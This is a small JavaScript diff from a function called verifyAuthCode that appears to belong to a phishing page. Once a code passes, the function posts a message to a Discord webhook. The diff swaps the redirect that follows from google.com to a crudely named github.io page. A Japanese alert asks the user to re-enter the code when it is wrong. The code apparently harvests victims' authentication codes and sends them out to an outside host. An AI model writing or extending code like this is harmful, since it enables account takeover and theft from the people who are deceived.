@@ -52,7 +52,7 @@ async function verifyAuthCode() {
 
         await sendToDiscord(webhookUrl, message);
 
-        window.location.href = 'https://www.google.com';
+        window.location.href = 'https://hazimeteotukaisab.github.io/Google_and_playPenis_love/errorfome.html';
     } else {
         alert('認証コードが間違っています。もう一度お試しください。');
     }
